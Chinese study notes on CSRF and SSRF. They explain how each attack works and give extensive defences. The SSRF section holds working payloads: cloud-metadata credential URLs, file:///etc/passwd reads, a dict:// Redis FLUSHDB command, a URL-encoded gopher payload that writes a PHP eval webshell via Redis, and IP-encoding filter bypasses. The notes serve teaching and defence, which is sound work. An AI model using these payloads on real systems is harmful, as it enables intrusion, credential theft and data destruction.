# 一、CSRF（跨站请求伪造）
## 1. 简介与危害
+ 全称：Cross-site request forgery，跨站请求伪造，也叫**one-click attack**
+ 原理：攻击者伪造请求，欺骗已登录用户点击，利用浏览器自动携带Cookie的特性，以用户身份执行未授权操作
+ 危害：可实现转账、修改密码、修改个人信息、新增管理员等敏感操作

## 2. 工作原理
1. 用户登录目标网站，浏览器存储认证Cookie（含sessionid）
2. 服务器仅通过Cookie验证用户身份
3. 攻击者诱导用户访问恶意页面/链接，浏览器自动携带Cookie发送请求
4. 服务器误认为是用户本人操作，执行恶意请求

## 3. 攻击前提条件
+ 存在CSRF漏洞
+ 用户已登录目标网站
+ 攻击者了解请求协议包
+ 浏览器支持Cookie自动携带
+ 用户点击恶意链接/页面

## 6. 防御方法
### 6.1 用户层面
1. 不点击恶意链接、不访问可疑网站
2. 关键网站使用后及时退出登录
3. 关键操作进行二次验证（短信、邮件、人脸识别）

### 6.2 开发层面
同源策略：让关键操作只来自自身域名的请求，不接受跨域请求

1. **CSRF Token**：服务端会话生成随机Token，请求携带并验证
2. **验证来源**：服务端检查Referer/Origin头，确保请求来自可信域
3. **双重提交Cookie**：客户端与服务器同时校验Token
4. **请求方法限制**：敏感操作服务端只接受 POST/PUT/DELETE，禁用GET
5. **SameSite Cookie**：设置为Strict/Lax，限制跨站Cookie发送

> **补充：**
>
> 1、 **SameSite** Cookie 是什么
>
> `SameSite` 是 Cookie 的一个属性，用来告诉浏览器：**跨站请求时，要不要把 Cookie 带过去**。它有三个值：`Strict`、`Lax`、`None`，其中前两个是 CSRF 防御的核心。
>
> 2、`SameSite=Strict`
>
> + **规则**：**任何跨站请求，都不携带 Cookie**
>     - 不管是点击链接、提交表单，还是 `<img>`/`<script>` 跨站请求，只要不是在当前域名的页面里发起的，Cookie 都不会带过去。
> + **效果**：CSRF 攻击完全没法用，因为浏览器根本不会把用户的认证 Cookie 传给目标网站。
> + **缺点**：用户体验差。比如你从别的网站点链接跳过来，Cookie 不携带，会直接变成“未登录状态”。
>
> 3、`SameSite=Lax`（浏览器默认值）
>
> + **规则**：**只允许“安全的导航型GET请求”携带Cookie**
>     - ✅ 允许：用户主动点击跨站链接、地址栏输入地址这种**导航式GET请求**，会带Cookie。
>     - ❌ 禁止：跨站的POST表单提交、`<img>`/`<script>`/`<iframe>` 自动发起的请求，不会带Cookie。
> + **效果**：既防住了绝大多数 CSRF 攻击（因为CSRF常用POST或自动GET请求），又不影响用户正常跳转体验。
> + **适用场景**：绝大多数网站的默认配置，平衡安全和体验。
>

# 二、SSRF（服务器请求伪造）
## 1. 简介与危害
+ 全称：Server-Side Request Forgery，服务器请求伪造
+ 原理：攻击者构造请求，由**服务端**发起请求，访问内网/本地资源
+ 核心特点：服务端可访问外网无法触及的内网系统

## 2. 业务场景
+ 远程图片加载、URL采集、在线翻译、文件读取等
+ 服务端未校验用户传入的URL，导致恶意请求被执行

## 3. 攻击利用方式
常用四类协议：`http/https`、`file`、`dict`、`gopher`，权限与攻击能力逐级增强。

1. 内网文件读取：`file://`
2. 内网网页扫描/云元数据：`http://`
3. 简单端口探测、单行数据库命令：`dict://`
4. SSRF最高权限、内网RCE、完整协议攻击：`gopher://`

### 3.1 HTTP / HTTPS（最基础，通用探测）
#### 3.1.1 作用
对内网存活扫描、端口探测、内网Web服务访问、读取内网接口数据、绕过前端访问内网后台。



#### 3.1.2 利用方式
1. 内网端口扫描

```plain
http://127.0.0.1:3306
http://192.168.1.1:8080
```

通过页面超时/报错差异判断端口开放。

2. 访问内网管理后台

```plain
http://127.0.0.1/admin
http://169.254.169.254/latest/meta-data  # AWS云服务器元数据泄露
```

3. 内网HTTP接口攻击

对内网未授权接口发起GET/POST请求，增删改数据。

内网 HTTP 接口一般是：内网后台、管理系统、API、微服务、监控面板、容器管理、运维工具（Jenkins、Nacos、Consul、K8s ApiServer）。  



常见攻击场景：

**场景 1：读取内网后台敏感数据**

内网存在管理后台 `http://127.0.0.1:8080/user/list`，未做鉴权，直接返回全部用户账号密码。 SSRF Payload：

```plain
http://漏洞网站/ssrf.php?url=http://127.0.0.1:8080/user/list
```

漏洞服务器会访问这个内网接口，把用户列表返回到页面。



**场景 2：调用内网高危修改接口（越权操作）**

内网接口 `http://192.168.0.10:9000/admin/del_user?id=1` 可删除管理员账号。 我们无法在外网直接访问，但 SSRF 可以代为发送 GET 请求，删除账号。



**场景 3：内网微服务 API 漏洞利用**

企业内网微服务之间无认证，接口支持新增管理员、上传文件、执行命令：

+ Nacos：未授权接口可新增账号、配置泄露；
+ Jenkins：内网接口可构建任务执行命令；
+ K8s ApiServer：内网未授权可接管全部容器；
+ SpringBoot Actuator：/env、/shutdown、/heapdump 泄露配置、关闭服务。

Payload 示例（读取 SpringBoot 配置）：

```plain
http://xxx/ssrf?url=http://127.0.0.1:8090/actuator/env
```



**场景 4：云服务器内网元数据接口（SSRF 内网 HTTP 攻击）**

阿里云 / AWS 内网存在特殊 HTTP 接口 `169.254.169.254`，外网无法访问，内网服务器可直接调取密钥、账号凭证：

```plain
http://xxx/ssrf?url=http://169.254.169.254/latest/meta-data/
```

拿到云服务器密钥，可直接接管整台云主机。



**场景 5：内网文件上传接口 getshell**

内网有上传接口 `http://127.0.0.1:8081/upload`，无校验可传 php 木马，通过 SSRF 间接访问上传地址写入 webshell。



#### 3.1.3 局限
只能发送标准HTTP请求，无法自定义TCP原始报文；不能操作非Web协议（Redis/Mysql/FTP）。



### 3.2 file 协议（读取本地文件，文件读取漏洞）
#### 3.2.1 作用
读取服务器本地任意文件，获取配置、密钥、源码、账号密码。

#### 3.2.2 利用Payload
```plain
file:///etc/passwd        # Linux 用户列表
file:///C:/Windows/System32/drivers/etc/hosts  # Windows hosts
file:///www/config.php    # 网站数据库配置文件
```

#### 3.2.3 限制
1. 仅读文件，**不能写文件**；
2. 部分PHP/Java环境会过滤`file://`协议；
3. 无法操作网络服务，只针对本地磁盘。



### 3.3 dict 协议（探测TCP端口、简单命令交互）
#### 3.3.1 作用
主动向任意TCP端口发送自定义单行数据，探测端口指纹、简单数据库交互。

#### 3.3.2 语法格式
`dict://ip:port/自定义数据`

#### 3.3.3 常见利用场景
1. **Redis 简单命令执行（单行指令）**

```plain
dict://127.0.0.1:6379/SET test 123
dict://127.0.0.1:6379/FLUSHDB
```

2. **Mysql 端口探测、发送探测语句**

```plain
dict://127.0.0.1:3306/select user();
```

3. **端口指纹识别**  
向端口发送测试字符，根据返回内容判断服务类型（Redis/Mongo/Mysql）。

#### 3.3.4 短板
只能发送**单行字符串**，不支持多行、复杂交互协议（Redis写shell需要多行报文，dict无法完成）。



### 3.4 gopher 协议
#### 3.4.1 核心优势
支持**完整自定义TCP数据流**，多行报文、二进制数据，可攻击绝大多数内网TCP服务，SSRF漏洞利用天花板。

#### 3.4.2 标准格式
`gopher://ip:port/_URLEncode后的TCP报文`  
下划线 `_` 代表TCP报文起始位置，所有换行、特殊字符必须URL编码。

#### 3.4.3 利用场景
#### （1）Redis 写WebShell（多行指令）
原始报文：

```plain
set shell "<?php eval($_GET[cmd]);?>"
config set dir /var/www/html
config set dbfilename shell.php
save
```

编码后payload：

```plain
gopher://127.0.0.1:6379/_%0D%0Aset%20shell%20%22%3C%3Fphp%20eval(%24_GET%5Bcmd%5D)%3B%3F%3E%22%0D%0Aconfig%20set%20dir%20/var/www/html%0D%0Aconfig%20set%20dbfilename%20shell.php%0D%0Asave%0D%0A
```

#### （2）攻击Mysql、PostgreSQL、FTP
完整构造登录、查询、建表报文，无需客户端。

#### （3）内网FastCGI攻击（PHP-FPM RCE）
构造FastCGI协议原始数据包，直接远程代码执行。

#### （4）内网Memcache、Zookeeper、Tomcat 未授权访问
#### 3.4.4 补充
1. 换行必须用 `%0d%0a`（CRLF）；
2. 部分语言（PHP）gopher默认不支持https，仅TCP；
3. 可绕过简单端口过滤、内网IP限制。

### 3.5 对比
| 协议 | 核心能力 | 适用场景 | 缺陷 |
| --- | --- | --- | --- |
| http/https | 发起HTTP请求，内网Web扫描 | 后台探测、云元数据读取 | 仅HTTP，无法操作TCP服务 |
| file | 读取服务器本地文件 | 拿配置、密码、源码 | 无网络操作能力 |
| dict | 单行TCP数据发送 | 端口探测、简单Redis单命令 | 不支持多行协议报文 |
| gopher | 自定义完整多行TCP原始数据包 | Redis写shell、FastCGI RCE、所有内网TCP服务攻击 | 报文需要手动URL编码，构造复杂 |




## 4. 危害
+ 内网端口扫描
+ 内网Web应用指纹识别
+ 攻击内网应用
+ 读取服务器本地文件

## 6. 漏洞成因
服务端提供外部数据获取功能，但**未对目标地址做过滤与限制**

## 7. 防御方法
### ① 禁止访问内网网段IP
1. 禁止访问的内网网段：  
回环段 `127.0.0.0/8`、私网A类 `10.0.0.0/8`、私网B类 `172.16.0.0/12`、私网C类 `192.168.0.0/16`。
2. 重点：  
不能只用字符串匹配过滤 `127.0.0.1`，攻击者可用**简写/十进制/十六进制/八进制IP**绕过：
+ 简写：`127.1`
+ 十进制：`2130706433`
+ 十六进制：`0x7f000001`
+ 八进制：`0177.0.0.1`
3. 正确防护逻辑：  
先解析URL拿到目标域名，DNS解析出真实IP，再判断IP网段，所有变形IP解析后都会还原标准内网IP，全部拦截。

### ② 协议白名单限制，仅允许 HTTP/HTTPS
1. 只放行 `http://`、`https://` 两种网页协议；
2. 直接禁用高危协议，从根源杜绝读取本地文件、攻击内网服务：  
`file://`（读服务器本地文件）、`ftp://`、`dict://`、`gopher://`（内网Redis/MySQL命令执行）。

### ③ 统一错误返回信息，消除端口探测差异
1. 漏洞风险：访问**开放端口**和**关闭端口**时，页面报错、响应时长、状态码不同，攻击者可根据差异扫描内网端口。
2. 防御手段：  
无论访问成功、失败、超时，全站返回完全一致的通用错误页面，屏蔽响应差异，无法判断端口是否开放。

### ④ 过滤返回内容，校验响应数据格式
1. 业务场景：远程图片加载、网页采集功能；
2. 校验规则：
+ 图片功能：仅接收jpg/png/gif图片二进制，过滤文本、配置源码；
+ 网页采集：过滤数据库账号、服务器路径、内网地址等敏感内容；
3. 效果：即使前面过滤被绕过，服务器也不会把hosts、网站配置等敏感信息回显给攻击者。

### ⑤ 限制请求端口范围
仅开放业务必需的80、443网页端口，拦截3306(MySQL)、6379(Redis)、21(FTP)、22(SSH)等高危内网端口。

### ⑥ 关闭URL自动重定向
配置curl/请求函数禁止跟随跳转，防止攻击者构造跳转域名，跳转至内网IP绕过第一层过滤。

### ⑦ 域名二次DNS校验（防御DNS重绑定绕过）
攻击者利用DNS短时间切换公网IP/内网IP绕过网段检测；  
防护：域名解析两次，两次解析IP都必须为公网IP才允许请求。

### ⑧ 部署独立代理服务转发请求
不直接用业务服务器发起网络请求，通过独立隔离的外网代理服务器访问目标地址，业务主机无法直接触达内网资产。

# 三、CSRF、XSS、SSRF核心区别
| 维度 | XSS | CSRF | SSRF |
| --- | --- | --- | --- |
| 攻击发起方 | 客户端（浏览器执行恶意 JS） | 客户端（用户浏览器） | 服务端（服务器主动发起网络请求） |
| 攻击目标 | 登录用户、浏览器会话 | 外网 Web 网站业务接口 | 服务器本地、内网资产 |
| 利用核心 | 恶意脚本注入并执行 | 跨域请求自动携带用户 Cookie | 服务端可控 URL 转发请求 |
| 能力特点 | 窃取 Cookie、劫持账号、钓鱼 | 冒用用户身份操作，无法拿 Cookie | 读取本地文件、扫描内网、攻击内网服务 |
| 核心防护方案 | 输入转义过滤、CSP、Cookie 设 **HttpOnly** | CSRF Token、**SameSite**、来源 Referer 校验 | 协议白名单、内网 IP 拦截、端口限制 |

# 四、总结
## Q1：CSRF 是什么？
跨站请求伪造

## Q2：SSRF 是什么？
服务端请求伪造

## Q3：CSRF 和 XSS 的区别是什么？
CSRF 是跨站请求伪造，XSS 是跨站脚本攻击

XSS利用的核心是窃取 cookie，直接使用 cookie 登录受害者账号；CSRF 利用的核心是诱导欺骗，不会获取受害者的信息，而是诱导受害者自己去执行某些恶意操作。

## Q4：CSRF 的危害？
盗号：诱导受害者修改自己的密码，修改自己的绑定手机号，发送敏感信息

改个人信息：诱导受害者修改自己的头像、个性签名、改自己的昵称

诱导受害者执行命令

## Q5：如何挖 CSRF 漏洞？
CSRF 一般无需白盒测试（代码审计），只有黑盒测试。

## Q6：同源策略是什么？
浏览器默认的安全配置，不同源的两个网站之间不能互相读写资源，如 cookie 无法读取，XHR（XMLhttprequest，Ajax，axios）无法发送

## Q7：同源网站是什么？
两个网站，协议一样，端口一样，域名和 IP 一样，就称为两个网站为同源。

## Q8：jsonp 跨域漏洞是什么？
jsonp 跨域漏洞的产生原因是因为没有注意敏感信息，直接用 jsonp 传输了敏感数据。

## Q9：CORS跨域漏洞是什么？
CORS 跨域漏洞的产生原因是因为没有注意敏感信息，直接用 CORS 传输了敏感数据。
